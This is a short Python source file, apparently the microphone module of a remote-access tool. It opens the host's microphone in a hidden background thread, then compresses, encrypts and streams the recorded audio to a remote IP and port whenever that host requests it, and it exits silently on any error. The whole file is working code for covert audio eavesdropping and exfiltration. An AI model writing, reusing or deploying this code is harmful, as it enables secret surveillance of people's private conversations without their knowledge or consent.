import threading
import pyaudio
import socket
import pickle
import zlib
import sys

from foreign.parse.crash_exception_handling import *
from foreign.global_state import *


@crash_exception_handling
def audio_action(ip, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ip, port))

  headersize = state['settings']['headersize']
  encryption = state['settings']['encryption']
  encoding = state['settings']['encoding']
  mode = [True, 0, b'']

  p = pyaudio.PyAudio()
  CHUNK = 81920
  FORMAT = pyaudio.paInt16
  RATE = 44100
  
  try:
    stream = p.open(format=FORMAT, channels=2, rate=RATE, input=True, output=False, frames_per_buffer=CHUNK)
  except:
    stream = p.open(format=FORMAT, channels=1, rate=RATE, input=True, output=False, frames_per_buffer=CHUNK)

  while True:
    try:
      client_msg = s.recv(81920)

      if mode[0]:
        mode[1] = int(client_msg[:headersize])
        mode[0] = False

      mode[2] += client_msg

      if len(mode[2])-headersize == mode[1]:
        frame = stream.read(CHUNK)
        frame = pickle.dumps(frame)
        frame = zlib.compress(frame, 9)
        frame = encryption.do_encrypt(frame)

        final_msg = bytes(f'{len(frame):<{headersize}}', encoding) + frame
        s.send(final_msg)

        mode = [True, 0, b'']
    except:
      stream.stop_stream()
      stream.close()
      p.terminate()
      sys.exit(0)


def audio(ip, port):
  threading.Thread(target=audio_action, args=(ip, port), daemon=True).start()
  return {'message': 'Audio thread started', 'text_mode': 'primary', 'text_extras': {'point': True}}